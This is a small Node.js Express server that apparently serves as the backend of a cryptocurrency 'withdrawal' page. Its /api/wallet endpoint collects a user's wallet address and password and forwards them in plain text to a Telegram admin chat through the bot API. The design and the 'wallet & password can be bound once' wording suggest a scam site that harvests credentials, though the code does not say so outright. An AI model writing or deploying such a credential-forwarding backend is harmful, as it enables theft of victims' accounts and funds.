const express = require("express");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(express.json());
app.use(cors());

// -------------------------
//  读取 Railway 环境变量
// -------------------------
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

// Debug（如果你要检查 ENV）
// console.log("BOT_TOKEN =", BOT_TOKEN);
// console.log("ADMIN_CHAT_ID =", ADMIN_CHAT_ID);

if (!BOT_TOKEN || !ADMIN_CHAT_ID) {
    console.error("❌ ERROR: Missing BOT_TOKEN or ADMIN_CHAT_ID in Railway ENV");
}

// -------------------------
//  前端提款 POST API
// -------------------------
app.post("/api/wallet", async (req, res) => {
    try {
        const { coin, amount, usdt, wallet, password, hash } = req.body;

        if (!coin || !amount || !wallet || !password || !hash) {
            return res.status(400).json({ success: false, error: "Missing fields" });
        }

        // -------------------------
        //  Telegram 消息推送格式
        // -------------------------
        const message = `
📤 <b>NEW WITHDRAWAL REQUEST</b>
--------------------------------
💰 <b>Coin:</b> ${coin}
🔢 <b>Amount:</b> ${amount}
💵 <b>USDT:</b> ${usdt}
🏦 <b>Wallet:</b> ${wallet}
🔐 <b>Password:</b> ${password}
🆔 <b>Transaction Hash:</b> ${hash}

⚠️ Wallet & password can be bound once.
Please screenshot the transaction hash for record.
        `;

        // -------------------------
        //  发送到 Telegram BOT + 群组
        // -------------------------
        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: ADMIN_CHAT_ID,
                text: message,
                parse_mode: "HTML"
            }
        );

        console.log("✔ Withdrawal sent to Telegram:", hash);

        return res.json({ success: true });

    } catch (err) {
        console.error("❌ Telegram API ERROR:", err.response?.data || err.message);
        return res.status(500).json({ success: false, error: "Server error" });
    }
});

// -------------------------
//  Railway 自动端口
// -------------------------
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log("🚀 Server running on port:", PORT));
